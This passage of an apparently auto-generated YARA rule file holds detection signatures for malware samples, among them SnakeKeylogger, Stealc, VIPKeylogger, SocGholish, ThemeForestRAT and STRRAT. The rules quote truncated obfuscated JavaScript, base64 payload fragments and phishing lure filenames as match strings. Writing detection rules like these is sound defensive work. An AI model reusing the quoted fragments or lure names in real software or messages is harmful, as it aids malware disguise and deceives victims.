      $s10 = "MV SEAFARER CTM.exePK" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 6000KB and
      all of them
}

rule SnakeKeylogger_signature__9f9374cf {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_9f9374cf.r00"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9f9374cfba7780d1f1015071d86c579ec7160b339726f16979e36724bf9ec3ca"
   strings:
      $s1 = "SW984394.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__effb35e8 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_effb35e8.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "effb35e84e5cca2e722798b69cd15498150d089582b9e3f0285f0a25fa7e691f"
   strings:
      $s1 = "Talimat formu v-4 Ref227982472  3611316041.exe" fullword ascii /* score: '19.00'*/
      $s2 = "RNjF+ H" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__f5b31c43 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f5b31c43.z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f5b31c4377b7263e14d7699d54e16b7aa60c194fe4f83bbacbe8da2e3da1e4a8"
   strings:
      $s1 = "+Payment Receipt Ref-7372862623846445056.exe" fullword ascii /* score: '19.00'*/
      $s2 = "getC<JD" fullword ascii /* score: '9.00'*/
      $s3 = "sFnd!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule SocGholish_signature_ {
   meta:
      description = "_subset_batch - file SocGholish(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f7605fc8a1ee5f21aec55da04dbaa95a05db95b5e7851b172a5d30c7fb1da885"
   strings:
      $s1 = "(function(_0x387246,_0x4ee9fb){var a0_0x547519={_0x133bbe:0x12b,_0x115798:0xe1,_0x3dffaa:0x183,_0x284b7e:0x17b,_0x52b724:0x194,_" ascii /* score: '13.00'*/
      $s2 = "x4cb20d){return a0_0x365b(_0x54aae8- -a0_0x294312._0xf8cfea,_0x4cb20d);}function _0x47e3b3(_0xde65c,_0x46d832){return a0_0x55fb5" ascii /* score: '12.00'*/
      $s3 = "6)]===undefined){var _0x343504=function(_0x5967ff){function _0x29294d(_0x5f3119,_0x3d0252){return _0x21c28b(_0x5f3119- -a0_0x61f" ascii /* score: '12.00'*/
      $s4 = "n _0x7b6b07(_0x47513d,_0x3705cb){return _0x4a2be8(_0x47513d,_0x3705cb- -0x4fe);}return a0_0x55fb5b(_0x25aec1-_0x139cfa[_0x7b6b07" ascii /* score: '12.00'*/
      $s5 = "_0x3b826e,_0x34fcfb=0x0;_0x3b826e=_0x34cbd2['charAt'](_0x34fcfb++);~_0x3b826e&&(_0x3b8a23=_0x55fb5b%0x4?_0x3b8a23*0x40+_0x3b826e" ascii /* score: '9.00'*/
      $s6 = "x3f5eb5['charCodeAt'](_0x2dc6d4)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x39f55d);};a0_0x365b['yJeGqd']=_" ascii /* score: '9.00'*/
      $s7 = "dd,-0x1a1)](0x10))[_0x29294d(-a0_0x3bfc33._0x2576bb,-a0_0x3bfc33._0x569ad3)](-0x2);}return decodeURIComponent(_0x312bce);},_0x28" ascii /* score: '9.00'*/
      $s8 = "_0x19b875=_0x5967ff['charAt'](_0xa10c6c++);~_0x19b875&&(_0x5286ad=_0x375ed7%0x4?_0x5286ad*0x40+_0x19b875:_0x19b875,_0x375ed7++%0" ascii /* score: '9.00'*/
      $s9 = "b(_0xde65c- -0x1d5,_0x46d832);}_0x3d8aba[a0_0x283115(':hgB')](a0_0x283115(_0x465f3e(-a0_0xe744cc._0x5226de,-a0_0xe744cc._0x36011" ascii /* score: '9.00'*/
      $s10 = "_0x4ca6ee._0x43f3e4)],_0x2b140c);}function _0x1c8b1d(_0x47038a,_0xe3d01){return a0_0x365b(_0x47038a- -a0_0x3a6164._0x409071,_0xe" ascii /* score: '8.00'*/
      $s11 = "0x252};function _0x2b3ac3(_0x5b7f7b,_0x280ecc){return a0_0x365b(_0x280ecc- -a0_0x45b9fd._0x1de5f6,_0x5b7f7b);}function _0x5ca726" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 60KB and
      8 of them
}

rule Stealc_signature__a56f115ee5ef2625bd949acaeec66b76_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2e6129b0aa7aed4e1161b9e09d14a2f5637cfd426e97fce1e95b0bee7ac28826"
   strings:
      $s1 = "PHP Command Line Interpreter" fullword wide /* score: '14.00'*/
      $s2 = " http://ccsca2021.ocsp-certum.com05" fullword ascii /* score: '10.00'*/
      $s3 = "http://subca.ocsp-certum.com01" fullword ascii /* score: '10.00'*/
      $s4 = "http://subca.ocsp-certum.com02" fullword ascii /* score: '10.00'*/
      $s5 = "https://keepass.info/ 0" fullword ascii /* score: '10.00'*/
      $s6 = "gchegkf" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule Stealc_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__056f5b6a {
   meta:
      description = "_subset_batch - file Stealc(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_056f5b6a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "056f5b6a71c966351c84a8e36d4956665262289cba313330a7ec44e932550546"
   strings:
      $s1 = "Sandbox.exe" fullword wide /* score: '22.00'*/
      $s2 = "dumpsta" fullword ascii /* score: '18.00'*/
      $s3 = " http://ccsca2021.ocsp-certum.com05" fullword ascii /* score: '10.00'*/
      $s4 = "http://subca.ocsp-certum.com01" fullword ascii /* score: '10.00'*/
      $s5 = "http://subca.ocsp-certum.com02" fullword ascii /* score: '10.00'*/
      $s6 = "https://keepass.info/ 0" fullword ascii /* score: '10.00'*/
      $s7 = "QhKp.gYn" fullword ascii /* score: '10.00'*/
      $s8 = "/getwltsvauu" fullword ascii /* score: '9.00'*/
      $s9 = "\"& /t b" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule Stealc_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__f8d2318e {
   meta:
      description = "_subset_batch - file Stealc(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_f8d2318e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f8d2318ed59d59a5299ac54a7a7276e8554b5bab6c2a5ced95314eb667327b5a"
   strings:
      $s1 = "qtcreator.exe" fullword wide /* score: '22.00'*/
      $s2 = "/dumpsta" fullword ascii /* score: '14.00'*/
      $s3 = " http://ccsca2021.ocsp-certum.com05" fullword ascii /* score: '10.00'*/
      $s4 = "http://subca.ocsp-certum.com01" fullword ascii /* score: '10.00'*/
      $s5 = "http://subca.ocsp-certum.com02" fullword ascii /* score: '10.00'*/
      $s6 = "https://keepass.info/ 0" fullword ascii /* score: '10.00'*/
      $s7 = "The Qt Company Ltd." fullword wide /* score: '9.00'*/
      $s8 = " 2008-2025 The Qt Company Ltd." fullword wide /* score: '9.00'*/
      $s9 = "qtcreator" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule Stealc_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__22dc4ba5 {
   meta:
      description = "_subset_batch - file Stealc(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_22dc4ba5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "22dc4ba59fdaff4f8259ad052bd99ff8db6b0cc7caac28b5d49f8013efe7cf05"
   strings:
      $s1 = " http://ccsca2021.ocsp-certum.com05" fullword ascii /* score: '10.00'*/
      $s2 = "http://subca.ocsp-certum.com01" fullword ascii /* score: '10.00'*/
      $s3 = "http://subca.ocsp-certum.com02" fullword ascii /* score: '10.00'*/
      $s4 = "https://keepass.info/ 0" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule ThemeForestRAT_signature_ {
   meta:
      description = "_subset_batch - file ThemeForestRAT(signature).macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cc4c18fefb61ec5b3c69c31beaa07a4918e0b0184cb43447f672f62134eb402b"
   strings:
      $s1 = "__ZN7CServer15InjectShellCodeEPcj" fullword ascii /* score: '23.00'*/
      $s2 = "__ZN7CServer17OnInjectShellCodeEjPbPcj" fullword ascii /* score: '23.00'*/
      $s3 = "__mh_execute_header" fullword ascii /* score: '19.00'*/
      $s4 = "@_pthread_mutex_lock" fullword ascii /* score: '18.00'*/
      $s5 = "<key>com.apple.security.get-task-allow</key>" fullword ascii /* score: '18.00'*/
      $s6 = "@_pthread_mutex_destroy" fullword ascii /* score: '18.00'*/
      $s7 = "@_pthread_mutex_init" fullword ascii /* score: '18.00'*/
      $s8 = "@_pthread_mutexattr_destroy" fullword ascii /* score: '18.00'*/
      $s9 = "@_pthread_mutex_setprioceiling" fullword ascii /* score: '18.00'*/
      $s10 = "@_pthread_mutexattr_settype" fullword ascii /* score: '18.00'*/
      $s11 = "@_pthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s12 = "/var/tmp/log.dat" fullword ascii /* score: '16.00'*/
      $s13 = "!com.apple.security.get-task-allow" fullword ascii /* score: '15.00'*/
      $s14 = "sysctl -n machdep.cpu.brand_string" fullword ascii /* score: '15.00'*/
      $s15 = "__ZN7CServer13OnViewProcessEjPb" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0xfacf and filesize < 300KB and
      8 of them
}

rule VIPKeylogger_signature__f4639a0b3116c2cfc71144b88a929cfd_imphash_ {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_f4639a0b3116c2cfc71144b88a929cfd(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "af262d4208c4d31144a152cc965265d1e0cdd6a6352bfbfc888583775340140e"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s3 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s4 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s5 = "nstall System v3.10</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s6 = "~nsu%X.tmp" fullword wide /* score: '11.00'*/
      $s7 = "QeqsU:\\" fullword ascii /* score: '10.00'*/
      $s8 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s9 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s10 = "skraahuens" fullword ascii /* score: '8.00'*/
      $s11 = "opganges" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__f4639a0b3116c2cfc71144b88a929cfd_imphash__6493721a {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_f4639a0b3116c2cfc71144b88a929cfd(imphash)_6493721a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6493721a95d547e441cf074c5b50dcd5cd7c47fd9179b1380ff7fc4f37bb0877"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s3 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s4 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s5 = "nstall System v3.10</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s6 = "~nsu%X.tmp" fullword wide /* score: '11.00'*/
      $s7 = "QeqsU:\\" fullword ascii /* score: '10.00'*/
      $s8 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s9 = "Q* /sV" fullword ascii /* score: '9.00'*/
      $s10 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s11 = "opganges" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__f4639a0b3116c2cfc71144b88a929cfd_imphash__7d957cce {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_f4639a0b3116c2cfc71144b88a929cfd(imphash)_7d957cce.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7d957cceab90148d9e96c61da9c1b62a8d31a64ef79cb3eafdb5a6b4fd586b8a"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s3 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s4 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s5 = "nstall System v3.10</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s6 = "~nsu%X.tmp" fullword wide /* score: '11.00'*/
      $s7 = "QeqsU:\\" fullword ascii /* score: '10.00'*/
      $s8 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s9 = "s)* /e(eINR" fullword ascii /* score: '9.00'*/
      $s10 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s11 = "opganges" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule Stealc_signature__dc4152fd8ffd9d76d82af552da62e323_imphash__103dae28 {
   meta:
      description = "_subset_batch - file Stealc(signature)_dc4152fd8ffd9d76d82af552da62e323(imphash)_103dae28.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "103dae28c1b7812375c285163ede0b117a949988bf46e0b26a65ef37b866e215"
   strings:
      $s1 = "creation2.exe" fullword wide /* score: '22.00'*/
      $s2 = "YYYYYZ" fullword ascii /* reversed goodware string 'ZYYYYY' */ /* score: '16.50'*/
      $s3 = "XXXXZZ" fullword ascii /* reversed goodware string 'ZZXXXX' */ /* score: '13.50'*/
      $s4 = "ZZZXXX" fullword ascii /* reversed goodware string 'XXXZZZ' */ /* score: '13.50'*/
      $s5 = "YZZZZZ" fullword ascii /* reversed goodware string 'ZZZZZY' */ /* score: '13.50'*/
      $s6 = " http://ccsca2021.ocsp-certum.com05" fullword ascii /* score: '10.00'*/
      $s7 = "http://subca.ocsp-certum.com01" fullword ascii /* score: '10.00'*/
      $s8 = "http://subca.ocsp-certum.com02" fullword ascii /* score: '10.00'*/
      $s9 = "https://keepass.info/ 0" fullword ascii /* score: '10.00'*/
      $s10 = "XYYYYZYZZ" fullword ascii /* score: '9.50'*/
      $s11 = "PXZXYYYY" fullword ascii /* score: '9.50'*/
      $s12 = "ZXYYYYYZZY" fullword ascii /* score: '9.50'*/
      $s13 = "ZZYYYYX" fullword ascii /* score: '9.50'*/
      $s14 = "ZZZYYYYX" fullword ascii /* score: '9.50'*/
      $s15 = "YYYYXXY" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 19000KB and
      8 of them
}

rule Stealc_signature__dc4152fd8ffd9d76d82af552da62e323_imphash__8241a68d {
   meta:
      description = "_subset_batch - file Stealc(signature)_dc4152fd8ffd9d76d82af552da62e323(imphash)_8241a68d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8241a68dea2bf5c1a604633c978e7f1a3fc90e5b8cfc0e6225fe63b25ad16cc9"
   strings:
      $s1 = "qtcreator.exe" fullword wide /* score: '22.00'*/
      $s2 = "YZZZZZZ" fullword ascii /* reversed goodware string 'ZZZZZZY' */ /* score: '16.50'*/
      $s3 = "YXZZZXZYZY" fullword ascii /* base64 encoded string 'avYevXe' */ /* score: '16.50'*/
      $s4 = "YXZYZXZYZ" fullword ascii /* base64 encoded string 'avXevX' */ /* score: '16.50'*/
      $s5 = "XXXXZZ" fullword ascii /* reversed goodware string 'ZZXXXX' */ /* score: '13.50'*/
      $s6 = "AZAZAZ" fullword ascii /* reversed goodware string 'ZAZAZA' */ /* score: '13.50'*/
      $s7 = "XYZZZY" fullword ascii /* reversed goodware string 'YZZZYX' */ /* score: '13.50'*/
      $s8 = "XZYXXX" fullword ascii /* reversed goodware string 'XXXYZX' */ /* score: '13.50'*/
      $s9 = "YXYXYX" fullword ascii /* reversed goodware string 'XYXYXY' */ /* score: '13.50'*/
      $s10 = " http://ccsca2021.ocsp-certum.com05" fullword ascii /* score: '10.00'*/
      $s11 = "http://subca.ocsp-certum.com01" fullword ascii /* score: '10.00'*/
      $s12 = "http://subca.ocsp-certum.com02" fullword ascii /* score: '10.00'*/
      $s13 = "https://keepass.info/ 0" fullword ascii /* score: '10.00'*/
      $s14 = "ZYYYYYY" fullword ascii /* score: '9.50'*/
      $s15 = "XYYYYZXZYYX" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 22000KB and
      8 of them
}

rule Stealc_signature__dc4152fd8ffd9d76d82af552da62e323_imphash__e5bacfec {
   meta:
      description = "_subset_batch - file Stealc(signature)_dc4152fd8ffd9d76d82af552da62e323(imphash)_e5bacfec.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e5bacfeceae6b4edd71d42c3dd45ba53be68bb779017b4ad40290c6ad81489d9"
   strings:
      $s1 = "qtcreator.exe" fullword wide /* score: '22.00'*/
      $s2 = "ZZZXXX" fullword ascii /* reversed goodware string 'XXXZZZ' */ /* score: '13.50'*/
      $s3 = "XYZZZY" fullword ascii /* reversed goodware string 'YZZZYX' */ /* score: '13.50'*/
      $s4 = "ZYYXXX" fullword ascii /* reversed goodware string 'XXXYYZ' */ /* score: '13.50'*/
      $s5 = " http://ccsca2021.ocsp-certum.com05" fullword ascii /* score: '10.00'*/
      $s6 = "http://subca.ocsp-certum.com01" fullword ascii /* score: '10.00'*/
      $s7 = "http://subca.ocsp-certum.com02" fullword ascii /* score: '10.00'*/
      $s8 = "https://keepass.info/ 0" fullword ascii /* score: '10.00'*/
      $s9 = "YXXYYYY" fullword ascii /* score: '9.50'*/
      $s10 = "XYYYYXZ" fullword ascii /* score: '9.50'*/
      $s11 = "ZYYYYZXZ" fullword ascii /* score: '9.50'*/
      $s12 = "YZYYYYZ" fullword ascii /* score: '9.50'*/
      $s13 = "YYYYZXXZZX" fullword ascii /* score: '9.50'*/
      $s14 = "YYYYZZX" fullword ascii /* score: '9.50'*/
      $s15 = "The Qt Company Ltd." fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 19000KB and
      8 of them
}

rule STRRAT_signature_ {
   meta:
      description = "_subset_batch - file STRRAT(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1faa83d779d9cf290063946cd2f9b46559b44a3a469f6079ce4f5f712b8c2aa9"
   strings:
      $s1 = "eDNFXHgzRVx4MjFceDNFXHgzRVx4MjFceDNFXHgzRVx4NTVceDIxXHgzRVx4M0VceDIxXHgzRVx4M0VceDIxXHgzRVx4M0VceDIxXHgzRVx4M0VceDIxXHgzRVx4M0Vc" ascii /* base64 encoded string 'x3E\x3E\x21\x3E\x3E\x21\x3E\x3E\x55\x21\x3E\x3E\x21\x3E\x3E\x21\x3E\x3E\x21\x3E\x3E\x21\x3E\x3E\' */ /* score: '21.00'*/
      $s2 = "NFx4NzBceDY5XHg0NVx4NzRceDY1XHg0M1x4NkNceDc0XHg1Mlx4NThceDczXHg2OFx4NEVceDZBXHg1NVx4NEFceDUzXHg0Mlx4NTZceDQ5XHg3M1x4NjNceDU2XHg0" ascii /* base64 encoded string '4\x70\x69\x45\x74\x65\x43\x6C\x74\x52\x58\x73\x68\x4E\x6A\x55\x4A\x53\x42\x56\x49\x73\x63\x56\x4' */ /* score: '21.00'*/
      $s3 = "NjlceDZEXHg3MFx4MzVceDc5XHgzNVx4NjZceDc3XHg0Nlx4NTFceDUzXHg3N1x4NjNceDQ5XHgzNlx4NzNceDU3XHg2RFx4NzVceDY5XHg1MVx4NDZceDIxXHgzRVx4" ascii /* base64 encoded string '69\x6D\x70\x35\x79\x35\x66\x77\x46\x51\x53\x77\x63\x49\x36\x73\x57\x6D\x75\x69\x51\x46\x21\x3E\x' */ /* score: '21.00'*/
      $s4 = "MVx4NTNceDc0XHg3Mlx4NEZceDU2XHg3MVx4NEFceDc5XHg3Nlx4NkNceDQ0XHg1NVx4NkFceDQzXHg0OVx4NDhceDM1XHg3N1x4NkRceDZDXHg2MVx4NDlceDYxXHg2" ascii /* base64 encoded string '1\x53\x74\x72\x4F\x56\x71\x4A\x79\x76\x6C\x44\x55\x6A\x43\x49\x48\x35\x77\x6D\x6C\x61\x49\x61\x6' */ /* score: '21.00'*/
      $s5 = "XHg2OVx4NTFceDcxXHg1OVx4NThceDVBXHg1MVx4MzhceDZDXHg0Mlx4NzVceDM5XHg2OVx4NDRceDRCXHg1NFx4MzZceDJCXHgzMFx4MjFceDNFXHgzRVx4NTZceDRE" ascii /* base64 encoded string '\x69\x51\x71\x59\x58\x5A\x51\x38\x6C\x42\x75\x39\x69\x44\x4B\x54\x36\x2B\x30\x21\x3E\x3E\x56\x4D' */ /* score: '21.00'*/
      $s6 = "MjFceDNFXHgzRVx4NTFceDRDXHgyMVx4M0VceDNFXHgyMVx4M0VceDNFXHgyMVx4M0VceDNFXHg1QVx4MjFceDNFXHgzRVx4MjFceDNFXHgzRVx4MjFceDNFXHgzRVx4" ascii /* base64 encoded string '21\x3E\x3E\x51\x4C\x21\x3E\x3E\x21\x3E\x3E\x21\x3E\x3E\x5A\x21\x3E\x3E\x21\x3E\x3E\x21\x3E\x3E\x' */ /* score: '21.00'*/
      $s7 = "NVx4NjFceDcxXHg0Q1x4NEZceDY3XHgzMlx4NkVceDM0XHg0OVx4NzJceDUxXHgzNVx4MzZceDcyXHg1NFx4NERceDUyXHg3NVx4NjhceDU2XHgzNVx4NjFceDQ1XHg0" ascii /* base64 encoded string '5\x61\x71\x4C\x4F\x67\x32\x6E\x34\x49\x72\x51\x35\x36\x72\x54\x4D\x52\x75\x68\x56\x35\x61\x45\x4' */ /* score: '21.00'*/
      $s8 = "eDc1XHg3OFx4NTlceDQ0XHgzOFx4NTJceDM3XHg0Qlx4NjVceDQzXHgyRlx4NTVceDc5XHg3N1x4NkVceDc3XHg3Nlx4MzJceDZDXHg2RFx4NDJceDc2XHg0M1x4MkZc" ascii /* base64 encoded string 'x75\x78\x59\x44\x38\x52\x37\x4B\x65\x43\x2F\x55\x79\x77\x6E\x77\x76\x32\x6C\x6D\x42\x76\x43\x2F\' */ /* score: '21.00'*/
      $s9 = "NDhceDMyXHg1NFx4NTJceDU1XHgzOVx4NjlceDc1XHg2Q1x4NTlceDZEXHgzNlx4NjNceDZFXHg2MVx4NTBceDJGXHg2RFx4NTNceDU1XHg1MFx4NENceDQ4XHg3Mlx4" ascii /* base64 encoded string '48\x32\x54\x52\x55\x39\x69\x75\x6C\x59\x6D\x36\x63\x6E\x61\x50\x2F\x6D\x53\x55\x50\x4C\x48\x72\x' */ /* score: '21.00'*/
      $s10 = "eDYzXHg0OVx4MzNceDJGXHg2MVx4MzRceDY0XHg2RVx4MzBceDQyXHgyMVx4M0VceDNFXHgyMVx4M0VceDNFXHg0NFx4NDhceDIxXHgzRVx4M0VceDc3XHgyMVx4M0Vc" ascii /* base64 encoded string 'x63\x49\x33\x2F\x61\x34\x64\x6E\x30\x42\x21\x3E\x3E\x21\x3E\x3E\x44\x48\x21\x3E\x3E\x77\x21\x3E\' */ /* score: '21.00'*/
      $s11 = "eDRGXHg3MVx4NTJceDcxXHg2Q1x4NTNceDM1XHg2OFx4NDNceDM0XHg0Qlx4NEVceDQ1XHg0Qlx4NzRceDU3XHgzMFx4MzZceDM1XHg2Rlx4N0FceDZGXHgzMlx4NzFc" ascii /* base64 encoded string 'x4F\x71\x52\x71\x6C\x53\x35\x68\x43\x34\x4B\x4E\x45\x4B\x74\x57\x30\x36\x35\x6F\x7A\x6F\x32\x71\' */ /* score: '21.00'*/
      $s12 = "RVx4M0VceDYxXHg2N1x4NTJceDRBXHg3N1x4NzZceDczXHg2Qlx4NzZceDQ2XHgyRlx4NDNceDQyXHg3OVx4NTJceDREXHg1M1x4NEFceDY5XHg1NVx4NjNceDRDXHgy" ascii /* base64 encoded string 'E\x3E\x61\x67\x52\x4A\x77\x76\x73\x6B\x76\x46\x2F\x43\x42\x79\x52\x4D\x53\x4A\x69\x55\x63\x4C\x2' */ /* score: '21.00'*/
      $s13 = "M1x4MzJceDJGXHg0Rlx4MzFceDY2XHg2NVx4N0FceDcyXHg2NVx4NTVceDMzXHg0Rlx4NTRceDQzXHgzMlx4MzNceDZEXHg2NFx4NDZceDRGXHg2Nlx4N0FceDc0XHgz" ascii /* base64 encoded string '3\x32\x2F\x4F\x31\x66\x65\x7A\x72\x65\x55\x33\x4F\x54\x43\x32\x33\x6D\x64\x46\x4F\x66\x7A\x74\x3' */ /* score: '21.00'*/
      $s14 = "eDc5XHgzNFx4NjVceDRBXHgzNFx4NzVceDc0XHg0RFx4NERceDU3XHg0OFx4MkZceDZFXHg0RVx4NjNceDRFXHg0Nlx4NThceDQ3XHg0Mlx4NjVceDUzXHgzN1x4NERc" ascii /* base64 encoded string 'x79\x34\x65\x4A\x34\x75\x74\x4D\x4D\x57\x48\x2F\x6E\x4E\x63\x4E\x46\x58\x47\x42\x65\x53\x37\x4D\' */ /* score: '21.00'*/
      $s15 = "NDJceDZBXHg1OVx4NThceDRBXHg0RFx4NTlceDU3XHgzMVx4NjlceDYyXHg3OVx4MzlceDZCXHg1QVx4NkRceDY4XHgzMFx4NjRceDQ3XHg1Nlx4NkVceDVBXHg0M1x4" ascii /* base64 encoded string '42\x6A\x59\x58\x4A\x4D\x59\x57\x31\x69\x62\x79\x39\x6B\x5A\x6D\x68\x30\x64\x47\x56\x6E\x5A\x43\x' */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x7453 and filesize < 2000KB and
      8 of them
}

rule STRRAT_signature__7ece07ec {
   meta:
      description = "_subset_batch - file STRRAT(signature)_7ece07ec.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7ece07ecd8e25de058946ac190cff704a5f4404cb9fe81496814120e37e46b39"
   strings:
      $s1 = "OV0pOw0KdmFyIFh2aWVjU1gkWG4gPSAiIjsNCnRyeXsNClh2aWVjU1gkWG4gPSBqY19QeXpWdGRJW2VYWGdGaVJbNTVdXShlWFhnRmlSWzEwXSk7DQpYdmllY1NYJFhu" ascii /* score: '11.00'*/
      $s2 = "Z0ZElbZVhYZ0ZpUls1NV1dKGVYWGdGaVJbMTRdICsgWHZpZWNTWCRYbiArIGVYWGdGaVJbMTJdKTsNCmlmKFh2aWVjU1gkWG4gIT0gIiIpew0KWHZpZWNTWCRYbiA9IF" ascii /* score: '11.00'*/
      $s3 = "9QeXpWdGRJW2VYWGdGaVJbNzBdXShlWFhnRmlSWzI4XSwgZVhYZ0ZpUlsxOF0gKyBJU1hqamNCel9aICsgZVhYZ0ZpUlszMF0gKyBlWFhnRmlSWzE4XSArIEZ3dmFUSG" ascii /* score: '11.00'*/
      $s4 = "String.\\u0070\\u0072\\u006f\\u0074\\u006f\\u0074\\u0079\\u0070\\u0065.\\u006D\\u006F\\u0075\\u0073\\u0065 = {mp3: function(){va" ascii /* score: '8.00'*/
      $s5 = "ar i=0; i<this.toString().length; i++){d = eval(\"var cd = this.toString().substr(i, 1);cd;\") + d;}return d;}}.mp3;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7453 and filesize < 3000KB and
      all of them
}

rule STRRAT_signature__2 {
   meta:
